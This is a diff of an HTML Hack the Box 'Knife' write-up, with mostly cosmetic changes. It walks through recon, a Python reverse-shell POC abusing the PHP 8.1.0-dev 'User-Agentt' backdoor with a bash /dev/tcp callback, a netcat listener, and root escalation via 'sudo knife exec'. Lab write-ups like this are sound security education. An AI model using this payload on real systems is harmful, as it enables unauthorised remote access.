@@ -1,14 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2021-08-29 Sun 17:08 -->
+<!-- 2021-09-21 Tue 15:41 -->
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>HTB | knife</title>
 <meta name="generator" content="Org mode">
+<meta name="author" content="Simon Søndergaard Christensen">
 <link rel="stylesheet" type="text/css" href="static/style.css" />
 <script type="text/javascript">
-// @license magnet:?xt=urn:btih:1f739d935676111cfff4b4693e3816e664797050&amp;dn=gpl-3.0.txt GPL-v3-or-Later
+// @license magnet:?xt=urn:btih:e95b018ef3580986a04669f1b5879592219e2a7a&dn=public-domain.txt Public Domain
 <!--/*--><![CDATA[/*><!--*/
      function CodeHighlightOn(elem, id)
      {
@@ -67,7 +68,7 @@
 </div>
 </nav>
 <div id="outline-container-orgb5df3cb" class="outline-2">
-<h2 id="orgb5df3cb"><span class="section-number-2">1.</span> Introduction</h2>
+<h2 id="orgb5df3cb"><span class="section-number-2">1</span> Introduction</h2>
 <div class="outline-text-2" id="text-1">
 <p>
 Welcome back to another write-up for another Hack the Box machine.
@@ -78,7 +79,7 @@ This machine was running a webserver with an old PHP version on it, but we'll di
 </div>
 
 <div id="outline-container-org698bb0a" class="outline-2">
-<h2 id="org698bb0a"><span class="section-number-2">2.</span> Recon</h2>
+<h2 id="org698bb0a"><span class="section-number-2">2</span> Recon</h2>
 <div class="outline-text-2" id="text-2">
 <p>
 First things first, let's get to know this machine a little better shall we?
@@ -86,12 +87,12 @@ We'll start by examining what services the machine has running.
 </p>
 </div>
 <div id="outline-container-org3ca4f67" class="outline-3">
-<h3 id="org3ca4f67"><span class="section-number-3">2.1.</span> Nmap all ports</h3>
+<h3 id="org3ca4f67"><span class="section-number-3">2.1</span> Nmap all ports</h3>
 <div class="outline-text-3" id="text-2-1">
 <p>
 Below we see the output from the <code>nmap</code> scan.
 </p>
-<pre class="example" id="orgec24bd3">
+<pre class="example" id="orge9cfcdf">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ sudo nmap -sV -sC -p- -oA nmap/all_ports -iL target.txt          19:16
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 19:16 CEST
@@ -120,19 +121,19 @@ There is also an open <code>ssh</code> daemon running on port 22.
 </div>
 
 <div id="outline-container-orgfb10083" class="outline-3">
-<h3 id="orgfb10083"><span class="section-number-3">2.2.</span> Web enumeration</h3>
+<h3 id="orgfb10083"><span class="section-number-3">2.2</span> Web enumeration</h3>
 <div class="outline-text-3" id="text-2-2">
 <p>
 All right let us enumerate the webserver
 </p>
 </div>
 <div id="outline-container-orgc668221" class="outline-4">
-<h4 id="orgc668221"><span class="section-number-4">2.2.1.</span> Gobuster</h4>
+<h4 id="orgc668221"><span class="section-number-4">2.2.1</span> Gobuster</h4>
 <div class="outline-text-4" id="text-2-2-1">
 <p>
 <code>gobuster</code> didn't really give us anything of use other than <code>/index.php</code>.
 </p>
-<pre class="example" id="org04fd151">
+<pre class="example" id="orgc9d0b19">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ gobuster dir -u "http://10.129.180.32" -w ~/repositories/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -d -b 404,403                                                                                                  19:21
 ===============================================================
@@ -160,13 +161,13 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 </div>
 </div>
 <div id="outline-container-orgded9783" class="outline-4">
-<h4 id="orgded9783"><span class="section-number-4">2.2.2.</span> <code>/index.php</code></h4>
+<h4 id="orgded9783"><span class="section-number-4">2.2.2</span> <code>/index.php</code></h4>
 <div class="outline-text-4" id="text-2-2-2">
 <p>
 If we open up the site with a browser connected to a proxy like <code>zap</code> or <code>burp</code>, and navigate to <code>/index.php</code>.
 </p>
 
-<figure id="orgd804e82">
+<figure id="orgd00b8ea">
 <img src="assets/2021-07-26_19-51-07_screenshot.png" alt="2021-07-26_19-51-07_screenshot.png">
 
 <figcaption><span class="figure-number">Figure 1: </span>Rendered html of <code>/index.php</code></figcaption>
@@ -175,7 +176,7 @@ If we open up the site with a browser connected to a proxy like <code>zap</code>
 <p>
 The menu in the top right corner doesn't do anything, so let's take a look at the headers to see if there is anything useful.
 </p>
-<pre class="example" id="org1bd6134">
+<pre class="example" id="org7756cd2">
 HTTP/1.1 200 OK
 Date: Mon, 26 Jul 2021 17:20:52 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -196,11 +197,11 @@ If you look at the <code>X-Powered-By:</code> header, we see that it's is runnin
 </div>
 
 <div id="outline-container-org6ae3b39" class="outline-2">
-<h2 id="org6ae3b39"><span class="section-number-2">3.</span> Exploitation</h2>
+<h2 id="org6ae3b39"><span class="section-number-2">3</span> Exploitation</h2>
 <div class="outline-text-2" id="text-3">
 </div>
 <div id="outline-container-org805c013" class="outline-3">
-<h3 id="org805c013"><span class="section-number-3">3.1.</span> Finding the vulnerability</h3>
+<h3 id="org805c013"><span class="section-number-3">3.1</span> Finding the vulnerability</h3>
 <div class="outline-text-3" id="text-3-1">
 <p>
 Now that we're done gathering all information possible about the target, mainly the version numbers of the softare running on the server.
@@ -218,19 +219,19 @@ We can take a closer look at the POC to getter a better understand the backdoor.
 The backdoor allowed for remote code execution in the custom header "User-Agentt", notice the extra "t".
 </p>
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 1: </span>reverse shell POC code</label><pre class="src src-python"><span style="color: #b5bd68;">def</span> <span style="color: #de935f;">reverse_shell</span><span style="color: #c5c8c6;">(</span>args<span style="color: #c5c8c6;">)</span>:
-    <span style="color: #f0c674;">payload</span> = <span style="color: #c5c8c6;">(</span>
-        <span style="color: #8abeb7;">'bash -c "bash -i &gt;&amp; /dev/tcp/'</span>
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>reverse shell POC code</label><pre class="src src-python">def reverse_shell(args):
+    payload = (
+        'bash -c "bash -i &gt;&amp; /dev/tcp/'
         + args.lhost
-        + <span style="color: #8abeb7;">"/"</span>
+        + "/"
         + args.lport
-        + <span style="color: #8abeb7;">' 0&gt;&amp;1"'</span>
-    <span style="color: #c5c8c6;">)</span>
-    <span style="color: #f0c674;">injection</span> = request.get<span style="color: #c5c8c6;">(</span>
+        + ' 0&gt;&amp;1"'
+    )
+    injection = request.get(
         args.url,
-        headers=<span style="color: #8abeb7;">{</span><span style="color: #8abeb7;">"User-Agentt"</span>: <span style="color: #8abeb7;">"zerodiumsystem('"</span> + payload + <span style="color: #8abeb7;">"');"</span><span style="color: #8abeb7;">}</span>,
-        allow_redirects=<span style="color: #81a2be;">False</span>,
-    <span style="color: #c5c8c6;">)</span>
+        headers={"User-Agentt": "zerodiumsystem('" + payload + "');"},
+        allow_redirects=False,
+    )
 </pre>
 </div>
 <p>
@@ -248,7 +249,7 @@ Which is then injected into the special header "User-Agentt", inside the parenth
 </div>
 </div>
 <div id="outline-container-org5772ba3" class="outline-3">
-<h3 id="org5772ba3"><span class="section-number-3">3.2.</span> Popping shell</h3>
+<h3 id="org5772ba3"><span class="section-number-3">3.2</span> Popping shell</h3>
 <div class="outline-text-3" id="text-3-2">
 <p>
 First we setup a <code>netcat</code> listener on our machine:
@@ -261,7 +262,7 @@ $ nc -nlvp 4444
 <p>
 Then we execute the revshell POC script with the right arguments:
 </p>
-<pre class="example" id="org00bcc32">
+<pre class="example" id="org008a398">
 ┌──[c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife/php-8.1.0-dev-backdoor-rce ]
 └─&gt; $ python revshell_php_8.1.0-dev.py "http://10.129.180.32" 10.10.14.87 4444                                   20:02
 </pre>
@@ -269,7 +270,7 @@ Then we execute the revshell POC script with the right arguments:
 <p>
 And just like that we got a shell and user flag:
 </p>
-<pre class="example" id="org0a176da">
+<pre class="example" id="orgdc58fa0">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ nc -nlvp 4444                                                    19:56
 james@knife:/$ whoami
@@ -295,7 +296,7 @@ james@knife:~$
 </div>
 
 <div id="outline-container-orgde74795" class="outline-2">
-<h2 id="orgde74795"><span class="section-number-2">4.</span> Priv-esc</h2>
+<h2 id="orgde74795"><span class="section-number-2">4</span> Priv-esc</h2>
 <div class="outline-text-2" id="text-4">
 <p>
 Now that we got a shell, we must escalate our privileges to get <code>root</code>.
@@ -318,7 +319,7 @@ $ sudo knife exec -E 'exec "/bin/sh"'
 <p>
 So let's run it and get our <code>root</code> flag:
 </p>
-<pre class="example" id="org7f6e06d">
+<pre class="example" id="org458817d">
 james@knife:/$ sudo knife exec -E 'exec "/bin/bash"'
 sudo knife exec -E 'exec "/bin/bash"'
 
